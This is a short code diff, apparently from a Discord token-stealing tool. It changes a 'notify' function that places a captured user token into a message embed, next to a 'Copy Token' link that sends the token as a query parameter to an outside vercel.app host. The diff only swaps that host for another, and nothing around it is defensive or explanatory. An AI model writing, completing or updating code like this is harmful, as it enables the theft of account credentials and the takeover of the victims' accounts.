@@ -255,7 +255,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `<:68602gg:1349774096690315294> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Copy Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        value: `\`\`\`${token}\`\`\`\n[[Copy Token]](https://api-liard-kappa.vercel.app/api/view?data=${token})`,
         inline: false
     })
 
